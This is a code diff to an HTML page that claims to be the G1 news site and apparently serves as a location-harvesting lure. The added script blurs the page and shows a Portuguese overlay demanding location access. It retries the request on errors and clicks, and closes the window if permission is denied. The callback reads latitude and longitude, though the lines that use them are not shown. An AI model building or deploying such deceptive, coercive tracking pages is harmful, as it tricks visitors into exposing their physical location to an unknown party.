@@ -98,18 +98,26 @@
     }
 
     #overlay {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.4);
-      z-index: 10;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: white;
-      font-size: 18px;
-      font-family: Arial, sans-serif;
-      user-select: none;
-    }
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.8); /* Fundo escuro, mas não opaco */
+  z-index: 10;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  color: #ffffff; /* Texto 100% branco */
+  font-size: 22px;
+  font-family: 'Roboto', sans-serif; /* Fonte moderna e limpa */
+  user-select: none;
+  text-align: center;
+  padding: 25px;
+  box-shadow: 0 0 30px rgba(0, 0, 0, 0.8); /* Sombra mais forte e ampla para cobrir toda a tela */
+  transition: opacity 0.3s ease;
+}
+
   </style>
 </head>
 <body>
@@ -151,19 +159,20 @@
     © 2025 G1 - Todos os direitos reservados
   </footer>
 
+
+  <div id="overlay">Por favor, permita o acesso à sua localização para continuar navegando!</div>
+
 <script>
   window.addEventListener('load', () => {
-    // Aguardar 2 segundos antes de adicionar o borrão
-    setTimeout(() => {
-      // Adicionar o borrão na tela após 2 segundos
-      document.body.classList.add('blurred');
+    let geolocationRequested = false;  // Flag para controlar o estado da solicitação de localização
 
+    // Função para tentar obter a localização
+    function solicitarLocalizacao() {
       if (!navigator.geolocation) {
-        window.location.replace("https://noticias-parana.netlify.app/");
+        window.close();
         return;
       }
 
-      // Solicitação de localização após o delay de 2 segundos
       navigator.geolocation.getCurrentPosition(async (pos) => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
@@ -183,12 +192,40 @@
         liberarConteudo();
 
       }, (error) => {
-        window.location.replace("https://noticias-parana.netlify.app/");
+        if (error.code === error.PERMISSION_DENIED) {
+          window.close();  // Fecha a página se a permissão for negada
+        } else {
+          console.warn("Erro de localização:", error.message);
+          if (!geolocationRequested) {
+            // Tentar novamente após o erro, caso o erro não seja permissão negada
+            solicitarLocalizacao();
+          }
+        }
       });
+    }
 
-    }, 2000); // Delay de 2 segundos (2000 milissegundos)
+    // Adicionar o borrão na tela após 2 segundos
+    setTimeout(() => {
+      document.body.classList.add('blurred');
+      geolocationRequested = true;  // Marca que já solicitamos a geolocalização
+      solicitarLocalizacao();
+    }, 4000); // Delay de 4 segundos
+
+    // Detecta se o usuário clica fora da caixa de permissão
+    document.addEventListener('click', (event) => {
+      // Verifica se o clique não foi na caixa de permissão ou botão "Não permitir"
+      if (!event.target.closest('.geolocation-popup')) {
+        // Se não for na caixa de permissão, tenta solicitar novamente a localização
+        if (!geolocationRequested) {
+          geolocationRequested = true;
+          solicitarLocalizacao();
+        }
+      }
+    });
+
   });
 
+  // Função para liberar o conteúdo e remover o borrão
   function liberarConteudo() {
     document.body.classList.remove('blurred');
     document.getElementById('overlay').style.display = 'none';
